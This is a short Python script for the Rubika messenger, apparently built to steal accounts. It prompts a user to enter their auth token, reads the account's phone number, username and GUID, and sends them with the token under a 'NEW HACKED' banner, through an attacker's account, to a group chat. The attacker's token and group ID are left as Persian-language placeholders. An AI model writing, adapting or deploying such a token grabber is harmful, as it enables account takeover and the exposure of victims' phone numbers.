import os
from rubiran import *
os.system("clear")
from datetime import datetime
timr = datetime.now().strftime("%H:%M:%S")

auth = input("Enter Auth : ")
bot = rubiran(auth)

sender = rubiran("اوث اکانتی که اوث هارو بفرسته تو گپ")
os.system("clear")

XCODER = bot.editbio(" ")

phone = (XCODER)["data"]["user"]["phone"]

id_use = (XCODER)["data"]["user"]["username"]

guid = (XCODER)["data"]["user"]["user_guid"]

info = f"""‌‌🔓┅┅┅𝐍𝐄𝐖 𝐇𝐀𝐂𝐊𝐄𝐃┅┅┅🔓

┎[⚙️] 𝐀𝐔𝐓𝐇 :
┇{auth}
┇
┇[⚙️] 𝐆𝐔𝐈𝐃 :
┇{guid}
┇
┇[⚙️] 𝐈𝐃 𝐀𝐂𝐂 : @{id_use}
┇
┇[⚙️] 𝐏𝐇𝐎𝐍𝐄 : {phone}
┇
┖[⚙️] 𝐓𝐈𝐌𝐄 𝐇𝐀𝐂𝐊𝐄𝐃 : {timr}

❴ 𝐂𝐑𝐄𝐓𝐎𝐑 : @X_CODER ❵"""

okb = "گوید گپی که اوثا توش سند شن"
sender.sendMessage(okb,info)
